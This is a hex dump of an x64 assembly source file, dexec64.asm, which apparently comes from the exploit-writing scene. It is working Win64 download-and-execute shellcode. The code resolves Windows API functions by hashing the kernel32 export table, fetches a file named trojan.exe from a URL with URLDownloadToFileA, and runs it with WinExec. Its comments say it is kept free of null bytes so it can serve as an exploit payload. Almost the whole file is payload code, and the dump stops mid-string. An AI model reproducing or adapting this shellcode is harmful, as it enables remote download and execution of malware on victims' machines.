00000000  3b 0d 0a 3b 20 64 65 78  65 63 36 34 2e 61 73 6d  |;..; dexec64.asm|
00000010  20 2d 20 32 31 38 2b 20  62 79 74 65 73 20 28 75  | - 218+ bytes (u|
00000020  6e 6f 70 74 69 6d 69 73  65 64 29 0d 0a 3b 0d 0a  |noptimised)..;..|
00000030  3b 20 57 69 6e 36 34 20  61 73 6d 20 63 6f 64 65  |; Win64 asm code|
00000040  2c 20 64 6f 77 6e 6c 6f  61 64 20 26 20 65 78 65  |, download & exe|
00000050  63 75 74 65 20 66 69 6c  65 20 75 73 69 6e 67 20  |cute file using |
00000060  55 52 4c 44 6f 77 6e 6c  6f 61 64 54 6f 46 69 6c  |URLDownloadToFil|
00000070  65 41 20 6d 6f 6e 69 6b  65 72 20 26 20 57 69 6e  |eA moniker & Win|
00000080  45 78 65 63 0d 0a 3b 0d  0a 3b 20 74 65 73 74 65  |Exec..;..; teste|
00000090  64 20 6f 6e 20 41 4d 44  36 34 20 72 75 6e 6e 69  |d on AMD64 runni|
000000a0  6e 67 20 57 69 6e 64 6f  77 73 20 78 36 34 20 53  |ng Windows x64 S|
000000b0  50 31 0d 0a 3b 0d 0a 3b  20 74 68 65 72 65 20 70  |P1..;..; there p|
000000c0  72 6f 62 61 62 6c 79 20  61 72 65 20 65 72 72 6f  |robably are erro|
000000d0  72 73 20 69 6e 20 74 68  65 20 63 6f 64 65 2c 20  |rs in the code, |
000000e0  62 75 74 20 74 68 69 73  20 69 73 20 6d 6f 72 65  |but this is more|
000000f0  20 6f 66 20 61 6e 20 65  78 70 65 72 69 6d 65 6e  | of an experimen|
00000100  74 61 6c 20 73 6f 75 72  63 65 20 69 66 20 6e 6f  |tal source if no|
00000110  74 68 69 6e 67 20 65 6c  73 65 2e 0d 0a 3b 20 73  |thing else...; s|
00000120  65 6e 64 20 63 6f 72 72  65 63 74 69 6f 6e 73 20  |end corrections |
00000130  6f 72 20 65 72 72 6f 72  73 20 74 6f 3a 20 27 77  |or errors to: 'w|
00000140  65 69 73 73 27 20 77 79  73 65 31 30 31 20 5b 61  |eiss' wyse101 [a|
00000150  74 5d 20 67 6d 61 69 6c  20 5b 64 6f 74 5d 20 63  |t] gmail [dot] c|
00000160  6f 6d 0d 0a 3b 20 63 6f  64 65 20 69 73 20 6e 6f  |om..; code is no|
00000170  74 20 6f 70 74 69 6d 69  73 65 64 20 61 74 20 61  |t optimised at a|
00000180  6c 6c 2c 20 64 6f 65 73  6e 27 74 20 63 6f 6e 74  |ll, doesn't cont|
00000190  61 69 6e 20 6e 75 6c 6c  20 62 79 74 65 73 2c 20  |ain null bytes, |
000001a0  73 6f 20 69 73 20 70 6f  73 73 69 62 6c 79 20 73  |so is possibly s|
000001b0  75 69 74 61 62 6c 65 20  66 6f 72 20 74 65 73 74  |uitable for test|
000001c0  69 6e 67 20 65 78 70 6c  6f 69 74 73 20 6f 6e 20  |ing exploits on |
000001d0  77 69 6e 36 34 0d 0a 3b  0d 0a 3b 20 6f 6e 65 20  |win64..;..; one |
000001e0  6f 66 20 74 68 65 20 6d  61 69 6e 20 73 74 75 6d  |of the main stum|
000001f0  62 6c 69 6e 67 20 62 6c  6f 63 6b 73 20 69 6e 20  |bling blocks in |
00000200  63 6f 64 69 6e 67 20 78  36 34 20 61 73 6d 20 6f  |coding x64 asm o|
00000210  6e 20 77 69 6e 64 6f 77  73 20 69 73 20 74 68 65  |n windows is the|
00000220  20 61 6c 69 67 6e 6d 65  6e 74 20 6f 66 20 74 68  | alignment of th|
00000230  65 20 73 74 61 63 6b 2e  0d 0a 3b 20 69 74 20 6d  |e stack...; it m|
00000240  75 73 74 20 62 65 20 61  6c 69 67 6e 65 64 20 62  |ust be aligned b|
00000250  79 20 31 36 20 62 79 74  65 73 20 62 65 63 61 75  |y 16 bytes becau|
00000260  73 65 20 77 69 6e 64 6f  77 73 20 75 73 65 73 20  |se windows uses |
00000270  31 32 38 2d 62 69 74 20  53 53 45 32 2c 20 6f 74  |128-bit SSE2, ot|
00000280  68 65 72 77 69 73 65 20  74 68 65 20 61 70 69 20  |herwise the api |
00000290  63 61 6c 6c 20 77 69 6c  6c 20 66 61 69 6c 2e 0d  |call will fail..|
000002a0  0a 3b 0d 0a 3b 20 74 68  61 6e 78 3a 0d 0a 3b 0d  |.;..; thanx:..;.|
000002b0  0a 3b 20 72 6f 79 20 67  20 62 69 76 2f 32 39 61  |.; roy g biv/29a|
000002c0  20 2d 20 68 74 74 70 3a  2f 2f 77 77 77 2e 32 39  | - http://www.29|
000002d0  61 2e 6e 65 74 2f 0d 0a  3b 20 46 65 72 79 6e 6f  |a.net/..; Feryno|
000002e0  20 2d 20 68 74 74 70 3a  2f 2f 66 65 72 79 6e 6f  | - http://feryno|
000002f0  2e 68 6f 73 74 2e 73 6b  0d 0a 3b 20 54 6f 6d 61  |.host.sk..; Toma|
00000300  73 7a 20 47 72 79 73 7a  74 61 72 20 2d 20 68 74  |sz Grysztar - ht|
00000310  74 70 3a 2f 2f 66 6c 61  74 61 73 73 65 6d 62 6c  |tp://flatassembl|
00000320  65 72 2e 6f 72 67 0d 0a  3b 0d 0a 66 6f 72 6d 61  |er.org..;..forma|
00000330  74 20 50 45 36 34 20 63  6f 6e 73 6f 6c 65 20 34  |t PE64 console 4|
00000340  2e 30 0d 0a 65 6e 74 72  79 20 65 6e 74 72 79 70  |.0..entry entryp|
00000350  6f 69 6e 74 0d 0a 0d 0a  73 65 63 74 69 6f 6e 20  |oint....section |
00000360  27 2e 74 65 78 74 27 20  63 6f 64 65 20 72 65 61  |'.text' code rea|
00000370  64 61 62 6c 65 20 77 72  69 74 65 61 62 6c 65 20  |dable writeable |
00000380  65 78 65 63 75 74 61 62  6c 65 20 20 20 20 20 3b  |executable     ;|
00000390  20 61 73 73 75 6d 65 64  20 74 6f 20 62 65 20 77  | assumed to be w|
000003a0  72 69 74 65 61 62 6c 65  20 77 68 65 6e 20 69 6e  |riteable when in|
000003b0  20 6d 65 6d 6f 72 79 2c  20 6e 6f 20 4e 58 20 6f  | memory, no NX o|
000003c0  62 73 74 72 75 63 74 69  6f 6e 21 0d 0a 0d 0a 20  |bstruction!.... |
000003d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000003f0  20 20 20 20 20 20 20 20  20 20 3b 20 31 2a 38 20  |          ; 1*8 |
00000400  69 73 20 75 73 65 64 20  72 61 74 68 65 72 20 74  |is used rather t|
00000410  68 61 6e 20 30 2a 38 20  62 65 63 61 75 73 65 20  |han 0*8 because |
00000420  69 74 20 75 73 65 73 20  6e 75 6c 6c 20 62 79 74  |it uses null byt|
00000430  65 0d 0a 4c 6f 61 64 4c  69 62 72 61 72 79 41 20  |e..LoadLibraryA |
00000440  20 20 20 20 20 20 20 20  65 71 75 20 20 72 62 70  |        equ  rbp|
00000450  2b 31 2a 38 20 20 20 20  20 20 20 20 20 20 3b 20  |+1*8          ; |
00000460  75 73 69 6e 67 20 72 62  70 20 69 73 20 73 6d 61  |using rbp is sma|
00000470  6c 6c 65 72 20 74 68 61  6e 20 75 73 69 6e 67 20  |ller than using |
00000480  65 62 70 20 6f 6e 20 36  34 2d 62 69 74 0d 0a 57  |ebp on 64-bit..W|
00000490  69 6e 45 78 65 63 20 20  20 20 20 20 20 20 20 20  |inExec          |
000004a0  20 20 20 20 65 71 75 20  20 72 62 70 2b 32 2a 38  |    equ  rbp+2*8|
000004b0  0d 0a 55 52 4c 44 6f 77  6e 6c 6f 61 64 54 6f 46  |..URLDownloadToF|
000004c0  69 6c 65 41 20 20 20 65  71 75 20 20 72 62 70 2b  |ileA   equ  rbp+|
000004d0  33 2a 38 20 20 20 20 20  20 20 20 20 20 3b 20 6d  |3*8          ; m|
000004e0  75 73 74 20 62 65 20 72  62 70 20 62 65 63 61 75  |ust be rbp becau|
000004f0  73 65 20 6f 66 20 36 34  2d 62 69 74 20 55 52 4c  |se of 64-bit URL|
00000500  4d 4f 4e 20 62 61 73 65  20 61 64 64 72 65 73 73  |MON base address|
00000510  0d 0a 0d 0a 65 6e 74 72  79 70 6f 69 6e 74 3a 0d  |....entrypoint:.|
00000520  0a 20 20 20 6a 6d 70 20  67 65 74 5f 65 69 70 0d  |.   jmp get_eip.|
00000530  0a 6c 6f 61 64 5f 64 74  61 3a 0d 0a 20 20 20 70  |.load_dta:..   p|
00000540  6f 70 20 20 72 61 78 0d  0a 20 20 20 70 75 73 68  |op  rax..   push|
00000550  20 72 61 78 0d 0a 20 20  20 6c 65 61 20 20 72 31  | rax..   lea  r1|
00000560  35 2c 5b 72 61 78 2d 28  73 65 74 75 70 5f 73 74  |5,[rax-(setup_st|
00000570  61 63 6b 2d 68 61 73 68  65 73 29 5d 0d 0a 20 20  |ack-hashes)]..  |
00000580  20 69 6e 63 20 20 62 79  74 65 20 5b 72 61 78 2d  | inc  byte [rax-|
00000590  28 73 65 74 75 70 5f 73  74 61 63 6b 2d 75 72 6c  |(setup_stack-url|
000005a0  5f 65 6e 64 29 5d 20 20  20 20 20 20 20 20 20 20  |_end)]          |
000005b0  3b 20 6e 75 6c 6c 69 66  79 20 74 61 69 6c 20 65  |; nullify tail e|
000005c0  6e 64 20 6f 66 20 75 72  6c 0d 0a 20 20 20 69 6e  |nd of url..   in|
000005d0  63 20 20 62 79 74 65 20  5b 72 61 78 2d 28 73 65  |c  byte [rax-(se|
000005e0  74 75 70 5f 73 74 61 63  6b 2d 66 6e 61 6d 65 5f  |tup_stack-fname_|
000005f0  65 6e 64 29 5d 20 20 20  20 20 20 20 20 3b 20 6e  |end)]        ; n|
00000600  75 6c 6c 69 66 79 20 65  6e 64 20 6f 66 20 66 69  |ullify end of fi|
00000610  6c 65 6e 61 6d 65 0d 0a  20 20 20 69 6e 63 20 20  |lename..   inc  |
00000620  62 79 74 65 20 5b 72 61  78 2d 28 73 65 74 75 70  |byte [rax-(setup|
00000630  5f 73 74 61 63 6b 2d 75  72 6c 5f 6d 6f 6e 5f 65  |_stack-url_mon_e|
00000640  6e 64 29 5d 20 20 20 20  20 20 3b 20 6e 75 6c 6c  |nd)]      ; null|
00000650  69 66 79 20 65 6e 64 20  6f 66 20 55 52 4c 4d 4f  |ify end of URLMO|
00000660  4e 0d 0a 20 20 20 72 65  74 20 20 20 20 20 20 20  |N..   ret       |
00000670  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000690  20 20 20 20 20 3b 20 67  6f 21 0d 0a 0d 0a 68 61  |     ; go!....ha|
000006a0  73 68 65 73 3a 0d 0a 20  20 20 64 77 20 20 30 62  |shes:..   dw  0b|
000006b0  62 38 36 68 20 20 20 20  20 20 20 20 20 3b 20 4c  |b86h         ; L|
000006c0  6f 61 64 4c 69 62 72 61  72 79 41 28 29 20 20 20  |oadLibraryA()   |
000006d0  20 20 36 33 35 62 62 62  38 36 0d 0a 20 20 20 64  |  635bbb86..   d|
000006e0  77 20 20 30 61 33 33 33  68 20 20 20 20 20 20 20  |w  0a333h       |
000006f0  20 20 3b 20 57 69 6e 45  78 65 63 28 29 20 20 20  |  ; WinExec()   |
00000700  20 20 20 20 20 20 20 32  30 38 64 61 33 33 33 0d  |       208da333.|
00000710  0a 0d 0a 20 20 20 64 62  20 20 27 55 52 4c 4d 4f  |...   db  'URLMO|
00000720  4e 27 2c 30 66 66 68 2c  30 66 66 68 0d 0a 75 72  |N',0ffh,0ffh..ur|
00000730  6c 5f 6d 6f 6e 5f 65 6e  64 20 20 20 3d 20 20 20  |l_mon_end   =   |
00000740  24 2d 32 0d 0a 0d 0a 20  20 20 64 77 20 20 30 35  |$-2....   dw  05|
00000750  66 39 32 68 20 20 20 20  20 20 20 20 20 3b 20 55  |f92h         ; U|
00000760  52 4c 44 6f 77 6e 6c 6f  61 64 54 6f 46 69 6c 65  |RLDownloadToFile|
00000770  41 20 20 20 20 63 39 31  65 35 66 39 32 0d 0a 20  |A    c91e5f92.. |
00000780  20 20 64 71 20 20 2d 31  0d 0a 66 6e 61 6d 65 3a  |  dq  -1..fname:|
00000790  0d 0a 20 20 20 64 62 20  20 27 74 72 6f 6a 61 6e  |..   db  'trojan|
000007a0  2e 65 78 65 27 2c 30 66  66 68 20 20 20 20 20 20  |.exe',0ffh      |
000007b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007c0  20 20 3b 20 77 68 61 74  20 74 6f 20 73 61 76 65  |  ; what to save|
000007d0  20 61 73 0d 0a 66 6e 61  6d 65 5f 65 6e 64 20 20  | as..fname_end  |
000007e0  3d 20 20 20 24 2d 31 0d  0a 0d 0a 75 72 6c 3a 0d  |=   $-1....url:.|
000007f0  0a 20 20 20 64 62 20 20  27 68 74 74 70 3a 2f 2f  |.   db  'http://|
00000800  6c 6f 63 61 6c 68 6f 73  74 2f 74 72 6f 6a 61 6e  |localhost/trojan|
00000810  2e 65 78 65 27 2c 30 66  66 68 20 20 20 20 20 20  |.exe',0ffh      |
00000820  20 3b 20 77 68 65 72 65  20 74 6f 20 64 6f 77 6e  | ; where to down|
00000830  6c 6f 61 64 20 66 69 6c  65 20 66 72 6f 6d 0d 0a  |load file from..|
00000840  75 72 6c 5f 65 6e 64 20  20 3d 20 20 20 24 2d 31  |url_end  =   $-1|
00000850  0d 0a 0d 0a 67 65 74 5f  65 69 70 3a 0d 0a 20 20  |....get_eip:..  |
00000860  20 63 61 6c 6c 20 20 6c  6f 61 64 5f 64 74 61 0d  | call  load_dta.|
00000870  0a 73 65 74 75 70 5f 73  74 61 63 6b 3a 0d 0a 20  |.setup_stack:.. |
00000880  20 20 61 64 64 20 20 72  73 70 2c 2d 28 34 2a 38  |  add  rsp,-(4*8|
00000890  29 20 20 20 20 3b 20 33  20 61 70 69 20 76 61 72  |)    ; 3 api var|
000008a0  69 61 62 6c 65 73 2c 20  2b 20 31 20 66 6f 72 20  |iables, + 1 for |
000008b0  61 76 6f 69 64 69 6e 67  20 6e 75 6c 6c 20 3a 2d  |avoiding null :-|
000008c0  7c 0d 0a 20 20 20 70 75  73 68 20 20 72 73 70 0d  ||..   push  rsp.|
000008d0  0a 20 20 20 70 6f 70 20  20 72 62 70 20 20 20 20  |.   pop  rbp    |
000008e0  20 20 20 20 20 20 20 3b  20 72 62 70 20 3d 20 74  |       ; rbp = t|
000008f0  61 62 6c 65 20 6f 66 20  61 70 69 0d 0a 20 20 20  |able of api..   |
00000900  6d 6f 76 20 20 72 64 69  2c 72 62 70 20 20 20 20  |mov  rdi,rbp    |
00000910  20 20 20 3b 20 72 64 69  20 70 6f 69 6e 74 73 20  |   ; rdi points |
00000920  74 6f 20 74 61 62 6c 65  20 61 6c 73 6f 0d 0a 20  |to table also.. |
00000930  20 20 73 74 6f 73 71 20  20 20 20 20 20 20 20 20  |  stosq         |
00000940  20 20 20 20 20 3b 20 64  6f 65 73 6e 27 74 20 72  |     ; doesn't r|
00000950  65 61 6c 6c 79 20 64 6f  20 61 6e 79 74 68 69 6e  |eally do anythin|
00000960  67 2e 0d 0a 20 20 20 61  64 64 20 20 72 73 70 2c  |g...   add  rsp,|
00000970  2d 28 31 31 2a 38 29 20  20 20 3b 20 72 65 73 65  |-(11*8)   ; rese|
00000980  72 76 65 20 73 70 61 63  65 20 66 6f 72 20 77 69  |rve space for wi|
00000990  6e 64 6f 77 73 2c 20 77  68 65 6e 20 63 61 6c 6c  |ndows, when call|
000009a0  69 6e 67 20 61 70 69 0d  0a 0d 0a 20 20 20 70 75  |ing api....   pu|
000009b0  73 68 20 36 30 68 20 20  20 20 20 20 20 20 20 20  |sh 60h          |
000009c0  20 3b 20 48 65 6c 6c 6f  2c 20 52 61 74 74 65 72  | ; Hello, Ratter|
000009d0  2e 20 38 2d 44 0d 0a 20  20 20 70 6f 70 20 72 63  |. 8-D..   pop rc|
000009e0  78 0d 0a 20 20 20 6d 6f  76 20 72 61 78 2c 5b 67  |x..   mov rax,[g|
000009f0  73 3a 72 63 78 5d 20 20  20 3b 20 50 65 62 0d 0a  |s:rcx]   ; Peb..|
00000a00  20 20 20 6d 6f 76 20 72  61 78 2c 5b 72 61 78 2b  |   mov rax,[rax+|
00000a10  31 38 68 5d 20 20 3b 20  50 65 62 4c 64 72 0d 0a  |18h]  ; PebLdr..|
00000a20  20 20 20 6d 6f 76 20 72  73 69 2c 5b 72 61 78 2b  |   mov rsi,[rax+|
00000a30  33 30 68 5d 20 20 3b 20  4c 64 72 2e 49 6e 49 6e  |30h]  ; Ldr.InIn|
00000a40  69 74 69 61 6c 69 7a 61  74 69 6f 6e 4f 72 64 65  |itializationOrde|
00000a50  72 4d 6f 64 75 6c 65 4c  69 73 74 0d 0a 20 20 20  |rModuleList..   |
00000a60  6c 6f 64 73 71 20 20 20  20 20 20 20 20 20 20 20  |lodsq           |
00000a70  20 20 20 3b 20 73 6b 69  70 20 6e 74 64 6c 6c 2e  |   ; skip ntdll.|
00000a80  64 6c 6c 0d 0a 20 20 20  6d 6f 76 20 72 62 78 2c  |dll..   mov rbx,|
00000a90  5b 72 61 78 2b 31 30 68  5d 20 20 3b 20 6b 65 72  |[rax+10h]  ; ker|
00000aa0  6e 65 6c 33 32 2e 64 6c  6c 20 62 61 73 65 0d 0a  |nel32.dll base..|
00000ab0  0d 0a 20 20 20 6d 6f 76  20 63 6c 2c 32 20 20 20  |..   mov cl,2   |
00000ac0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000ad0  20 20 3b 20 67 65 74 20  32 20 61 70 69 20 66 69  |  ; get 2 api fi|
00000ae0  72 73 74 0d 0a 67 65 74  5f 61 70 69 73 5f 6c 6f  |rst..get_apis_lo|
00000af0  6f 70 3a 0d 0a 20 20 20  6d 6f 76 20 20 65 61 78  |op:..   mov  eax|
00000b00  2c 64 77 6f 72 64 5b 72  62 78 2b 33 63 68 5d 20  |,dword[rbx+3ch] |
00000b10  20 20 20 20 20 3b 20 4d  5a 20 68 65 61 64 65 72  |     ; MZ header|
00000b20  20 73 69 7a 65 0d 0a 20  20 20 6c 65 61 20 20 72  | size..   lea  r|
00000b30  73 69 2c 5b 72 62 78 2b  72 61 78 2b 37 38 68 5d  |si,[rbx+rax+78h]|
00000b40  20 20 20 20 20 20 20 3b  20 65 78 70 6f 72 74 20  |       ; export |
00000b50  64 69 72 65 63 74 6f 72  79 20 62 65 67 69 6e 73  |directory begins|
00000b60  20 61 74 20 38 38 68 0d  0a 20 20 20 6d 6f 76 20  | at 88h..   mov |
00000b70  20 65 61 78 2c 64 77 6f  72 64 5b 72 73 69 2b 31  | eax,dword[rsi+1|
00000b80  30 68 5d 20 20 20 20 20  20 3b 20 65 78 74 72 61  |0h]      ; extra|
00000b90  20 69 6e 73 74 72 75 63  74 69 6f 6e 73 20 6e 65  | instructions ne|
00000ba0  65 64 65 64 20 74 6f 20  61 76 6f 69 64 20 6e 75  |eded to avoid nu|
00000bb0  6c 6c 20 62 79 74 65 73  0d 0a 20 20 20 6c 65 61  |ll bytes..   lea|
00000bc0  20 20 72 73 69 2c 5b 72  62 78 2b 72 61 78 2b 31  |  rsi,[rbx+rax+1|
00000bd0  63 68 5d 0d 0a 0d 0a 20  20 20 6c 6f 64 73 64 0d  |ch]....   lodsd.|
00000be0  0a 20 20 20 6c 65 61 20  20 72 39 2c 5b 72 61 78  |.   lea  r9,[rax|
00000bf0  2b 72 62 78 5d 0d 0a 20  20 20 6c 6f 64 73 64 0d  |+rbx]..   lodsd.|
00000c00  0a 20 20 20 6c 65 61 20  20 72 31 30 2c 5b 72 61  |.   lea  r10,[ra|
00000c10  78 2b 72 62 78 5d 0d 0a  20 20 20 6c 6f 64 73 64  |x+rbx]..   lodsd|
00000c20  0d 0a 20 20 20 6c 65 61  20 20 72 31 31 2c 5b 72  |..   lea  r11,[r|
00000c30  61 78 2b 72 62 78 5d 0d  0a 20 20 20 78 6f 72 20  |ax+rbx]..   xor |
00000c40  20 72 31 32 2c 72 31 32  0d 0a 6c 6f 61 64 5f 69  | r12,r12..load_i|
00000c50  6e 64 65 78 3a 0d 0a 20  20 20 6d 6f 76 20 20 65  |ndex:..   mov  e|
00000c60  73 69 2c 64 77 6f 72 64  5b 72 31 30 2b 34 2a 72  |si,dword[r10+4*r|
00000c70  31 32 5d 0d 0a 20 20 20  61 64 64 20 20 72 73 69  |12]..   add  rsi|
00000c80  2c 72 62 78 0d 0a 20 20  20 69 6e 63 20 20 72 31  |,rbx..   inc  r1|
00000c90  32 0d 0a 20 20 20 78 6f  72 20 20 65 61 78 2c 65  |2..   xor  eax,e|
00000ca0  61 78 0d 0a 20 20 20 63  64 71 0d 0a 68 61 73 68  |ax..   cdq..hash|
00000cb0  5f 65 78 70 6f 72 74 3a  0d 0a 20 20 20 6c 6f 64  |_export:..   lod|
00000cc0  73 62 0d 0a 20 20 20 61  64 64 20 20 65 64 78 2c  |sb..   add  edx,|
00000cd0  65 61 78 0d 0a 20 20 20  72 6f 6c 20 20 65 64 78  |eax..   rol  edx|
00000ce0  2c 20 35 0d 0a 20 20 20  64 65 63 20 20 65 61 78  |, 5..   dec  eax|
00000cf0  0d 0a 20 20 20 6a 6e 73  20 20 68 61 73 68 5f 65  |..   jns  hash_e|
00000d00  78 70 6f 72 74 0d 0a 20  20 20 72 6f 72 20 20 65  |xport..   ror  e|
00000d10  64 78 2c 20 35 0d 0a 20  20 20 63 6d 70 20 20 64  |dx, 5..   cmp  d|
00000d20  78 2c 77 6f 72 64 20 5b  72 31 35 5d 20 20 20 20  |x,word [r15]    |
00000d30  20 20 20 20 20 20 20 20  3b 20 66 6f 75 6e 64 20  |        ; found |
00000d40  61 70 69 3f 0d 0a 20 20  20 6a 6e 65 20 20 6c 6f  |api?..   jne  lo|
00000d50  61 64 5f 69 6e 64 65 78  0d 0a 0d 0a 20 20 20 6d  |ad_index....   m|
00000d60  6f 76 7a 78 20 20 65 64  78 2c 77 6f 72 64 20 5b  |ovzx  edx,word [|
00000d70  72 31 31 2b 32 2a 72 31  32 2d 32 5d 0d 0a 20 20  |r11+2*r12-2]..  |
00000d80  20 6d 6f 76 20 20 65 61  78 2c 5b 72 39 2b 34 2a  | mov  eax,[r9+4*|
00000d90  72 64 78 5d 0d 0a 20 20  20 61 64 64 20 20 72 61  |rdx]..   add  ra|
00000da0  78 2c 72 62 78 0d 0a 20  20 20 61 64 64 20 20 72  |x,rbx..   add  r|
00000db0  31 35 2c 32 20 20 20 20  20 20 20 20 20 20 20 20  |15,2            |
00000dc0  20 20 20 20 20 20 3b 20  73 6b 69 70 20 68 61 73  |      ; skip has|
00000dd0  68 0d 0a 0d 0a 20 20 20  73 74 6f 73 71 20 20 20  |h....   stosq   |
00000de0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000df0  20 20 20 20 3b 20 73 61  76 65 20 61 70 69 20 61  |    ; save api a|
00000e00  64 64 72 65 73 73 0d 0a  20 20 20 6c 6f 6f 70 20  |ddress..   loop |
00000e10  67 65 74 5f 61 70 69 73  5f 6c 6f 6f 70 0d 0a 0d  |get_apis_loop...|
00000e20  0a 20 20 20 70 75 73 68  20 20 72 31 35 20 20 20  |.   push  r15   |
00000e30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000e40  3b 20 70 75 73 68 2f 70  6f 70 20 74 6f 20 61 76  |; push/pop to av|
00000e50  6f 69 64 20 6e 75 6c 6c  20 77 69 74 68 20 6d 6f  |oid null with mo|
00000e60  76 0d 0a 20 20 20 70 6f  70 20 20 72 63 78 0d 0a  |v..   pop  rcx..|
00000e70  20 20 20 63 61 6c 6c 20  20 71 77 6f 72 64 5b 4c  |   call  qword[L|
00000e80  6f 61 64 4c 69 62 72 61  72 79 41 5d 0d 0a 0d 0a  |oadLibraryA]....|
00000e90  20 20 20 78 63 68 67 20  20 72 61 78 2c 72 62 78  |   xchg  rax,rbx|
00000ea0  0d 0a 20 20 20 61 64 64  20 20 72 31 35 2c 38 20  |..   add  r15,8 |
00000eb0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000ec0  20 20 3b 20 73 6b 69 70  20 55 52 4c 4d 4f 4e 2c  |  ; skip URLMON,|
00000ed0  20 66 69 72 73 74 20 74  69 6d 65 2e 0d 0a 20 20  | first time...  |
00000ee0  20 70 75 73 68 20 20 31  20 20 20 20 20 20 20 20  | push  1        |
00000ef0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00000f00  67 65 74 20 31 20 61 70  69 20 66 72 6f 6d 20 55  |get 1 api from U|
00000f10  52 4c 4d 4f 4e 0d 0a 20  20 20 70 6f 70 20 20 72  |RLMON..   pop  r|
00000f20  63 78 0d 0a 20 20 20 74  65 73 74 20 20 72 62 78  |cx..   test  rbx|
00000f30  2c 72 62 78 20 20 20 20  20 20 20 20 20 20 20 20  |,rbx            |
00000f40  20 20 20 20 3b 20 63 6f  6e 74 69 6e 75 65 20 69  |    ; continue i|
00000f50  66 20 6e 6f 74 20 7a 65  72 6f 0d 0a 20 20 20 6a  |f not zero..   j|
00000f60  6e 65 20 20 20 67 65 74  5f 61 70 69 73 5f 6c 6f  |ne   get_apis_lo|
00000f70  6f 70 0d 0a 0d 0a 20 20  20 64 65 63 20 20 65 63  |op....   dec  ec|
00000f80  78 0d 0a 20 20 20 70 75  73 68 20 20 72 62 78 0d  |x..   push  rbx.|
00000f90  0a 20 20 20 73 75 62 20  20 72 73 70 2c 33 2a 38  |.   sub  rsp,3*8|
00000fa0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000fb0  20 3b 20 6e 65 65 64 65  64 20 74 6f 20 61 6c 69  | ; needed to ali|
00000fc0  67 6e 20 73 74 61 63 6b  0d 0a 20 20 20 78 6f 72  |gn stack..   xor|
00000fd0  20 20 72 39 2c 72 39 0d  0a 20 20 20 6d 6f 76 20  |  r9,r9..   mov |
00000fe0  20 72 38 2c 72 31 35 0d  0a 20 20 20 6c 65 61 20  | r8,r15..   lea |
00000ff0  20 72 64 78 2c 5b 72 38  2b 28 75 72 6c 2d 66 6e  | rdx,[r8+(url-fn|
00001000  61 6d 65 29 5d 0d 0a 20  20 20 63 61 6c 6c 20 20  |ame)]..   call  |
00001010  71 77 6f 72 64 5b 55 52  4c 44 6f 77 6e 6c 6f 61  |qword[URLDownloa|
00001020  64 54 6f 46 69 6c 65 41  5d 0d 0a 0d 0a 20 20 20  |dToFileA]....   |
00001030  70 75 73 68 20 31 0d 0a  20 20 20 70 6f 70 20 20  |push 1..   pop  |
00001040  72 64 78 0d 0a 20 20 20  6d 6f 76 20 72 63 78 2c  |rdx..   mov rcx,|
00001050  72 31 35 0d 0a 20 20 20  63 61 6c 6c 20 20 71 77  |r15..   call  qw|
00001060  6f 72 64 5b 57 69 6e 45  78 65 63 5d 20 20 20 20  |ord[WinExec]    |
00001070  20 20 20 3b 20 57 69 6e  45 78 65 63 28 22 74 72  |   ; WinExec("tr|
00001080  6f 6a 61 6e 2e 65 78 65  22 2c 53 57 5f 53 48 4f  |ojan.exe",SW_SHO|
00001090  57 4e 4f 52 4d 41 4c 3f  3f 29 3b 0d 0a 0d 0a 20  |WNORMAL??);.... |
000010a0  20 20 3b 6a 6d 70 20 20  20 24 20 20 20 20 20 20  |  ;jmp   $      |
000010b0  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 68  |             ; h|
000010c0  61 6e 67 0d 0a 0d 0a 20  20 20 63 61 6c 6c 20 71  |ang....   call q|
000010d0  77 6f 72 64 5b 45 78 69  74 50 72 6f 63 65 73 73  |word[ExitProcess|
000010e0  5d 20 20 20 20 3b 20 6e  6f 74 20 72 65 71 75 69  |]    ; not requi|
000010f0  72 65 64 2c 20 74 65 73  74 69 6e 67 20 6f 6e 6c  |red, testing onl|
00001100  79 0d 0a 0d 0a 3b 20 73  65 63 74 69 6f 6e 20 62  |y....; section b|
00001110  65 6c 6f 77 20 6e 6f 74  20 72 65 71 75 69 72 65  |elow not require|
00001120  64 2c 20 73 69 6d 70 6c  79 20 66 6f 72 20 74 65  |d, simply for te|
00001130  73 74 69 6e 67 2e 0d 0a  73 65 63 74 69 6f 6e 20  |sting...section |
00001140  27 2e 69 64 61 74 61 27  20 69 6d 70 6f 72 74 20  |'.idata' import |
00001150  64 61 74 61 20 72 65 61  64 61 62 6c 65 20 77 72  |data readable wr|
00001160  69 74 65 61 62 6c 65 0d  0a 0d 0a 20 20 64 64 20  |iteable....  dd |
00001170  30 2c 30 2c 30 2c 52 56  41 20 6b 65 72 6e 65 6c  |0,0,0,RVA kernel|
00001180  5f 6e 61 6d 65 2c 52 56  41 20 6b 65 72 6e 65 6c  |_name,RVA kernel|
00001190  5f 74 61 62 6c 65 0d 0a  20 20 64 64 20 30 2c 30  |_table..  dd 0,0|
000011a0  2c 30 2c 30 2c 30 0d 0a  0d 0a 20 20 6b 65 72 6e  |,0,0,0....  kern|
000011b0  65 6c 5f 74 61 62 6c 65  3a 0d 0a 20 20 20 20 45  |el_table:..    E|
000011c0  78 69 74 50 72 6f 63 65  73 73 20 64 71 20 52 56  |xitProcess dq RV|
000011d0  41 20 5f 45 78 69 74 50  72 6f 63 65 73 73 0d 0a  |A _ExitProcess..|
000011e0  20 20 20 20 64 71 20 30  0d 0a 0d 0a 20 20 6b 65  |    dq 0....  ke|
000011f0  72 6e 65 6c 5f 6e 61 6d  65 20 64 62 20 27 4b 45  |rnel_name db 'KE|
00001200  52 4e 45 4c 33 32 2e 44  4c 4c 27 2c 30 0d 0a 0d  |RNEL32.DLL',0...|
00001210  0a 20 20 5f 45 78 69 74  50 72 6f 63 65 73 73 20  |.  _ExitProcess |
00001220  64 77 20 30 0d 0a 20 20  20 20 64 62 20 27 45 78  |dw 0..    db 'Ex|
